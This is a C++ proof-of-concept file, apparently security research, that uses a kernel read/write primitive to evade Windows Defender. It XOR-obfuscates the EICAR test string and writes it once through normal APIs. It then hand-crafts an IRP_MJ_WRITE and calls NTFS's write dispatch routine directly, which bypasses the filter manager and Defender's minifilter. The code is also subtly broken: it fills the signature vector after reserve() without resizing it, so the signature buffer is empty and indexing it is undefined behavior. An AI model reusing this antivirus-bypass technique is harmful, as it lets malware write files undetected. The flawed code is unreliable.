

#include <iostream>
#include <ntstatus.h>
#include <vector>

#include <Hvcnope.h>
#include <MockDriver.h>

#include "kernel/functions.h"

unsigned char EicarSignatureXored[] = {
    0x58 ^ 0x37, 0x35 ^ 0x37, 0x4F ^ 0x37, 0x21 ^ 0x37, 0x50 ^ 0x37, 0x25 ^ 0x37, 0x40 ^ 0x37, 0x41 ^ 0x37,
    0x50 ^ 0x37, 0x5B ^ 0x37, 0x34 ^ 0x37, 0x5C ^ 0x37, 0x50 ^ 0x37, 0x5A ^ 0x37, 0x58 ^ 0x37, 0x35 ^ 0x37,
    0x34 ^ 0x37, 0x28 ^ 0x37, 0x50 ^ 0x37, 0x5E ^ 0x37, 0x29 ^ 0x37, 0x37 ^ 0x37, 0x43 ^ 0x37, 0x43 ^ 0x37,
    0x29 ^ 0x37, 0x37 ^ 0x37, 0x7D ^ 0x37, 0x24 ^ 0x37, 0x45 ^ 0x37, 0x49 ^ 0x37, 0x43 ^ 0x37, 0x41 ^ 0x37,
    0x52 ^ 0x37, 0x2D ^ 0x37, 0x53 ^ 0x37, 0x54 ^ 0x37, 0x41 ^ 0x37, 0x4E ^ 0x37, 0x44 ^ 0x37, 0x41 ^ 0x37,
    0x52 ^ 0x37, 0x44 ^ 0x37, 0x2D ^ 0x37, 0x41 ^ 0x37, 0x4E ^ 0x37, 0x54 ^ 0x37, 0x49 ^ 0x37, 0x56 ^ 0x37,
    0x49 ^ 0x37, 0x52 ^ 0x37, 0x55 ^ 0x37, 0x53 ^ 0x37, 0x2D ^ 0x37, 0x54 ^ 0x37, 0x45 ^ 0x37, 0x53 ^ 0x37,
    0x54 ^ 0x37, 0x2D ^ 0x37, 0x46 ^ 0x37, 0x49 ^ 0x37, 0x4C ^ 0x37, 0x45 ^ 0x37, 0x21 ^ 0x37, 0x24 ^ 0x37,
    0x48 ^ 0x37, 0x2B ^ 0x37, 0x48 ^ 0x37, 0x2A ^ 0x37
};


const char* DetectableFileName = "Test1.txt";
const char* UndetectableFileName = "Test2.txt";

bool FileExists(const char* Filename)
{
    DWORD fileAttributes = GetFileAttributesA(Filename);
    return fileAttributes != INVALID_FILE_ATTRIBUTES;
}

bool RunTestUsermodeIo(std::vector<BYTE>& Signature) 
{
    std::cout << "[*] Running first test - writing EICAR to file with normal APIs\n";

    // create new file and write to it

    HANDLE maliciousFile = CreateFileA(
        DetectableFileName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL,
        0
    );

    if (maliciousFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    //
    // write EICAR to file - we might be stopped at the write itself,
    // but we should expect the file to be deleted anyways.
    //
    
    DWORD writtenBytes = 0;
    BOOL written = WriteFile(
        maliciousFile,
        &Signature[0],
        Signature.size(),
        &writtenBytes,
        NULL
    );

    if (!written || writtenBytes < Signature.size()) {
        std::cerr << "[*] File failed to be written to, le=" <<  GetLastError() << std::endl;

        CloseHandle(maliciousFile);
        return false;
    }

    // Wait for defender to delete the file
    Sleep(100);

    if (FileExists(DetectableFileName)) {
        std::cerr << "[-] Test failed - defender didn't delete the file" << std::endl;;
    } else {
        std::cout << "[+] Defender deleted the file!" << std::endl;
    }

    CloseHandle(maliciousFile);
    return TRUE;    
}

_DEVICE_OBJECT* GetVcbDeviceObject( const KernelPtr<FILE_OBJECT>& FileObject ) 
{
    // get VPB (volume parameter block)
    KernelPtr<VPB> vpb = FileObject->Vpb;
    return vpb->DeviceObject;
}

KernelPtr<IRP> CraftWriteIrp(
    PFILE_OBJECT FileObject,
    void* InputBuffer,
    size_t InputSize,
    _DEVICE_OBJECT* DeviceObject,
    IO_STATUS_BLOCK& Iosb) 
{
    constexpr CCHAR StackSize = 10; 

    KernelPtr<IRP> irp = IoAllocateIrp(StackSize, /*ChargeQuota=*/ false);
    irp->UserIosb = &Iosb;

    //
    // Even though the docs state that IRP_MJ_WRITE receives the buffer
    // in SystemBuffer, NTFS itself seems to use UserBuffer
    //
    irp->UserBuffer = InputBuffer;

    irp->Tail.Overlay.OriginalFileObject = (PVOID) FileObject;
    irp->Tail.Overlay.Thread =  (PVOID) KeGetCurrentThread();

    KernelPtr<IO_STACK_LOCATION> stackLocation = irp->Tail.Overlay.CurrentStackLocation;
    stackLocation->MajorFunction = IRP_MJ_WRITE;
    stackLocation->DeviceObject = DeviceObject;
    stackLocation->FileObject = FileObject;

    stackLocation->Parameters.Write.ByteOffset.QuadPart = 0;
    stackLocation->Parameters.Write.Length = InputSize;

    return irp;
}

bool RunTestKernelIo(std::vector<BYTE>& Signature)
{
    std::cout << "[*] Running kernel I/O Test" << std::endl;

    //
    // Start off normally - get a usermode handle to the file
    //

    HANDLE hMaliciousFile = CreateFileA(
        UndetectableFileName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL,
        0
    );

    if (hMaliciousFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to create file, le=" << GetLastError() << std::endl;
        return false;
    }

    //
    // Now we do funny things😈
    //
    // Start off by getting the file object's address.
    //

    std::optional<kAddress> pFileObjectType = g_KernelBinary->ResolveExport("IoFileObjectType");
    if (!pFileObjectType) {
        std::cerr << "Failed to resolve file object type" << std::endl;
        CloseHandle(hMaliciousFile);
        return false;
    }
    PVOID IoFileObjectType = (PVOID) g_Rw->ReadQword(pFileObjectType.value());
    std::cout << "[*] IoFileObjectType: 0x" << std::hex << kAddress(IoFileObjectType) << std::endl;

    PFILE_OBJECT maliciousFile = nullptr;
    NTSTATUS status = ObReferenceObjectByHandle(
        hMaliciousFile,
        FILE_READ_DATA | FILE_WRITE_DATA,
        IoFileObjectType,
        UserMode,
        (PVOID*) &maliciousFile,
        nullptr
    );

    if (!NT_SUCCESS(status)) {
        std::cerr << "[-] Failed to get file object by handle, status=0x" << std::hex << status << std::endl;
        CloseHandle(hMaliciousFile);
        return false;
    }

    std::cout << "[*] File object: 0x" << std::hex << kAddress(maliciousFile) << std::endl;

    //
    // Now we setup and send the IRP_MJ_WRITE IRP, to write our malicious signature
    // into the file without being detected by defender's WdFilter.sys
    //

    // The IRP should be sent into the VCB's device object.
    _DEVICE_OBJECT* vcbDeviceObject = GetVcbDeviceObject(maliciousFile);
    std::cout << "[*] VCB Device object: 0x" << std::hex << kAddress(vcbDeviceObject) << std::endl;
    
    IO_STATUS_BLOCK iosb = {0};

    KernelPtr<IRP> irp = CraftWriteIrp(
        maliciousFile,
        &Signature[0],
        Signature.size(),
        vcbDeviceObject,
        iosb
    );

    std::cout << "[*] About to send IRP 0x" << std::hex << kAddress(irp.get()) << std::endl;

    //
    // Theoretically possible to resolve this by getting the driver object \Filesystem\Ntfs
    // but it's kind-of a pain to get ObOpenObjectByName to work :(
    //

    std::cout << "Enter NtfsFsdWrite address:" << std::endl;
    kAddress _NtfsFsdWrite = 0;
    std::cin >> std::hex >> _NtfsFsdWrite;

    PDRIVER_DISPATCH NtfsFsdWrite = (PDRIVER_DISPATCH) _NtfsFsdWrite;

    //
    // Invoke the IRP handler of NTFS directly, bypassing FltMgr and thus 
    // any attached filter drivers, including the one used by Windows Defender :)
    //

    status = NtfsFsdWrite(vcbDeviceObject, irp.get());
    if (!NT_SUCCESS(status)) {
        std::cerr << "[-] Failed to process IRP, status=0x" << std::hex << status << std::endl;
        CloseHandle(hMaliciousFile);
        return false;
    }

    std::cout << "[+] IRP successfully received, " << iosb.Information << " malicious bytes written" << std::endl;

    // Wait for defender to supposedly do something
    Sleep(100);

    if (!FileExists(UndetectableFileName)) {
        std::cerr << "[-] File does not exist, maybe got caught in a scan?" << std::endl;
        CloseHandle(hMaliciousFile);
        return false;
    }

    std::cout << "[+] Aaaand defender didn't do anything about it" << std::endl;
    std::cout << "[*] Enter any key to directly open the file using WinAPI." << std::endl;
    std::cout << "If everything went right, defender will be very angry :)" << std::endl;

    char junk;
    std::cin >> junk;

    CloseHandle(hMaliciousFile);

    // open it again:)
    hMaliciousFile = CreateFileA(
        UndetectableFileName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL,
        0
    );

    if (hMaliciousFile == INVALID_HANDLE_VALUE) {
        std::cout << "[+] Failed at open! le=" << GetLastError() << std::endl;
        return true;
    }

    // still here? let's try to read from it

    char buf[4];
    DWORD readBytes = 0;

    if (!ReadFile(hMaliciousFile, buf, sizeof(buf), &readBytes, nullptr)) 
    {
        std::cout << "[+] Failed at read! le=" << GetLastError() << std::endl;
        return true;
    }

    // huh, weird. Let's wait a bit more just to be sure
    std::cout << "[*] Successfully read bytes from file, let's wait a bit" << std::endl;
    Sleep(300);

    if (!FileExists(UndetectableFileName)) {
        std::cout << "[+] File was deleted after read:)" << std::endl;
        return true;
    }

    std::cerr << "[-] Something is off, try opening with notepad to be sure" << std::endl;
    return false;
}



int main() 
{
    // initialize HvcNope
    HvcNope_Initialize(std::make_shared<MockDriverRw>());

    // initialize malicious signature
    std::vector<BYTE> eicar;
    eicar.reserve(sizeof(EicarSignatureXored));

    for (size_t i = 0; i < sizeof(EicarSignatureXored); i++)
    {
        eicar[i] = EicarSignatureXored[i] ^ 0x37;
    }


    bool succeeded = RunTestUsermodeIo(eicar);
    if (!succeeded) {
        std::cerr << "[-] Failed usermode test" << std::endl;
        return 1;
    }

    succeeded = RunTestKernelIo(eicar);
    if (!succeeded) {
        std::cerr << "[-] Failed kernel test" << std::endl;
        return 1;
    }

    std::cout << "[+] Both tests ran successfully!" << std::endl;
}